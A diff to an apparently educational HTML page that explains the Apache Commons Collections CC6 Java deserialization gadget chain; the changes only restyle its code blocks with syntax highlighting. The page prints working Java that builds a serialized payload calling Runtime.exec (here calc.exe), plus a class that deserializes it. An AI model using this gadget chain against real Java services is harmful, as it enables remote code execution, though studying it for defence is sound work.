@@ -164,46 +164,34 @@
     Below is how the gadget Chain looks like for commonsCollection6.
 </p>
 <p>
-    <pre>
-        <code>
-            java.io.ObjectInputStream.readObject()
-            java.util.HashSet.readObject()
-                java.util.HashMap.put()
-                java.util.HashMap.hash()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
-                        org.apache.commons.collections.map.LazyMap.get()
-                            org.apache.commons.collections.functors.ChainedTransformer.transform()
-                            org.apache.commons.collections.functors.InvokerTransformer.transform()
-                            java.lang.reflect.Method.invoke()
-                                java.lang.Runtime.exec()
-        </code>
-    </pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">java.io.<span style="color: #cf8e6d;">ObjectInputStream</span>.<span style="color: #56a8f5;">readObject</span>()
+java.util.<span style="color: #cf8e6d;">HashSet</span>.<span style="color: #56a8f5;">readObject</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">put</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">hash</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">hashCode</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">getValue</span>()
+            org.apache.commons.collections.map.<span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">get</span>()
+                org.apache.commons.collections.functors.<span style="color: #cf8e6d;">ChainedTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                org.apache.commons.collections.functors.<span style="color: #cf8e6d;">InvokerTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                java.lang.reflect.<span style="color: #cf8e6d;">Method</span>.<span style="color: #56a8f5;">invoke</span>()
+                    java.lang.<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #56a8f5;">exec</span>()</pre></div>
 </p>
 <p>
     let's divide the chain in 2 parts.<br><br>
     1st half<br>
-    <pre>
-        <code>
-            java.io.ObjectInputStream.readObject()
-            java.util.HashSet.readObject()
-                java.util.HashMap.put()
-                java.util.HashMap.hash()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
-        </code>
-    </pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">java.io.<span style="color: #cf8e6d;">ObjectInputStream</span>.<span style="color: #56a8f5;">readObject</span>()
+java.util.<span style="color: #cf8e6d;">HashSet</span>.<span style="color: #56a8f5;">readObject</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">put</span>()
+    java.util.<span style="color: #cf8e6d;">HashMap</span>.<span style="color: #56a8f5;">hash</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">hashCode</span>()
+        org.apache.commons.collections.keyvalue.<span style="color: #cf8e6d;">TiedMapEntry</span>.<span style="color: #56a8f5;">getValue</span>()</pre></div>
     <br>
     2nd half <br>
-    <pre>
-        <code>
-                            org.apache.commons.collections.map.LazyMap.get()
-                            org.apache.commons.collections.functors.ChainedTransformer.transform()
-                            org.apache.commons.collections.functors.InvokerTransformer.transform()
-                            java.lang.reflect.Method.invoke()
-                                java.lang.Runtime.exec()
-        </code>
-    </pre>
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">                        org.apache.commons.collections.map.<span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">get</span>()
+                        org.apache.commons.collections.functors.<span style="color: #cf8e6d;">ChainedTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                        org.apache.commons.collections.functors.<span style="color: #cf8e6d;">InvokerTransformer</span>.<span style="color: #56a8f5;">transform</span>()
+                        java.lang.reflect.<span style="color: #cf8e6d;">Method</span>.<span style="color: #56a8f5;">invoke</span>()
+                            java.lang.<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #56a8f5;">exec</span>()</pre></div>
 </p>
 <p>If you pay close attention, we already know how the 2nd half works, basically we set a hasmap and a transformerchain in lazyMap and when the get() doesn't find the key we get RCE</p>
 <p>So let focus our attention on the first part i.e the entry part.</p>
@@ -230,9 +218,9 @@
 </P>
 
 <p>
-    But if you pay close attention you can see that the HashMap.readObject() there is a function called <pre><code>putVal(hash(key), key, value, false, false);</code></pre>.
+    But if you pay close attention you can see that the HashMap.readObject() there is a function called <span style="background-color: #1e1f22; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">putVal(hash(key), key, value, false, false);</span>.
     <img src="images/cc/hashmapreadobjectcall.PNG"><br><br>
-    The<pre><Code>hash(key)</Code></pre> calls <pre><code> key.hashCode()</code></pre>.
+    The <span style="background-color: #1e1f22; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">hash(key)</span> calls <span style="background-color: #1e1f22; color: #bcbec4; font-family: 'JetBrains Mono',monospace; font-size: 9.8pt; padding: 2px 4px;">key.hashCode()</span>.
     <br>
     <br>
     <img src="images/cc/has_on_hashmap.PNG">
@@ -245,49 +233,44 @@
     SO below is how the modified code looks like for CommonsCollection6 Gadget Chain.
 </p>
 <p>
-    <pre>
-        <code>
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections.map.TransformedMap;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import java.io.*;
-import java.lang.annotation.Retention;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.TransformedMap;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+<span style="color: #cf8e6d;">import</span> java.io.*;
+<span style="color: #cf8e6d;">import</span> java.lang.annotation.Retention;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.Constructor;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationHandler;
+<span style="color: #cf8e6d;">import</span> java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
-import java.util.Map;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
 
-public class cc6complete {
-    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
-        Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
-            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
-            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">cc6complete</span> {
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws</span> <span style="color: #cf8e6d;">ClassNotFoundException</span>, <span style="color: #cf8e6d;">NoSuchMethodException</span>, <span style="color: #cf8e6d;">IllegalAccessException</span>, <span style="color: #cf8e6d;">InvocationTargetException</span>, <span style="color: #cf8e6d;">InstantiationException</span>, <span style="color: #cf8e6d;">IOException</span> {
+        <span style="color: #cf8e6d;">Transformer</span>[] transformers = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[]{
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">Runtime</span>.<span style="color: #cf8e6d;">class</span>),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Class</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[<span style="color: #b3ae60;">0</span>]}),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">Object</span>.<span style="color: #cf8e6d;">class</span>, <span style="color: #cf8e6d;">Object</span>[].<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[<span style="color: #b3ae60;">0</span>]}),
+            <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InvokerTransformer</span>(<span style="color: #6aab73;">"exec"</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[]{<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>}, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[]{<span style="color: #6aab73;">"calc.exe"</span>})
         };
-        Transformer transformerChain = new ChainedTransformer(transformers);
-        Map innerMap = new HashMap();
-        Map lazymap = LazyMap.decorate(innerMap,transformerChain);
-        TiedMapEntry tme = new TiedMapEntry(lazymap,"keykey");
-        Map newmap = new HashMap();
-        newmap.put(tme,"BLABLBLA");
-        lazymap.remove("keykey");
+        <span style="color: #cf8e6d;">Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(transformers);
+        <span style="color: #cf8e6d;">Map</span> innerMap = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        <span style="color: #cf8e6d;">Map</span> lazymap = <span style="color: #cf8e6d;">LazyMap</span>.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
+        <span style="color: #cf8e6d;">TiedMapEntry</span> tme = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TiedMapEntry</span>(lazymap, <span style="color: #6aab73;">"keykey"</span>);
+        <span style="color: #cf8e6d;">Map</span> newmap = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">HashMap</span>();
+        newmap.<span style="color: #56a8f5;">put</span>(tme, <span style="color: #6aab73;">"BLABLBLA"</span>);
+        lazymap.<span style="color: #56a8f5;">remove</span>(<span style="color: #6aab73;">"keykey"</span>);
 
-FileOutputStream fos = new FileOutputStream("testing11.ser");
-ObjectOutputStream oos = new ObjectOutputStream(fos);
-oos.writeObject(newmap);
-oos.close();
+        <span style="color: #cf8e6d;">FileOutputStream</span> fos = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">FileOutputStream</span>(<span style="color: #6aab73;">"testing11.ser"</span>);
+        <span style="color: #cf8e6d;">ObjectOutputStream</span> oos = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ObjectOutputStream</span>(fos);
+        oos.<span style="color: #56a8f5;">writeObject</span>(newmap);
+        oos.<span style="color: #56a8f5;">close</span>();
     }
-} 
-
-        </code>
-    </pre>
+}</pre></div>
 </p>
 <P>
     Keep in mind that when you execute this a calc.exe will popout and if you deserialize the payload stored in testing11.ser then also a calc.exe will pop up.
@@ -296,21 +279,17 @@ oos.close();
     If you don't want the calc.exe to pop duing the first time you have to use the reflections.
 </p>
 <p>
-    <pre>
-        <code>
-import java.io.FileInputStream;
-import java.io.ObjectInputStream;
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.io.FileInputStream;
+<span style="color: #cf8e6d;">import</span> java.io.ObjectInputStream;
 
-public class checkclass {
+<span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">class</span> <span style="color: #56a8f5;">checkclass</span> {
 
-    public static void main(String args[])
-    {
-          try {
-            FileInputStream fis = new FileInputStream("E:\\ysoserialresearch\\testing11.ser");
-            ObjectInputStream ois = new ObjectInputStream(fis);
+    <span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">static</span> <span style="color: #cf8e6d;">void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span> args[]) {
+        <span style="color: #cf8e6d;">try</span> {
+            <span style="color: #cf8e6d;">FileInputStream</span> fis = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">FileInputStream</span>(<span style="color: #6aab73;">"E:\\ysoserialresearch\\testing11.ser"</span>);
+            <span style="color: #cf8e6d;">ObjectInputStream</span> ois = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ObjectInputStream</span>(fis);
 
-       
-            Object obj = ois.readObject();
+            <span style="color: #cf8e6d;">Object</span> obj = ois.<span style="color: #56a8f5;">readObject</span>();</pre></div>
 
             ois.close();
             fis.close();
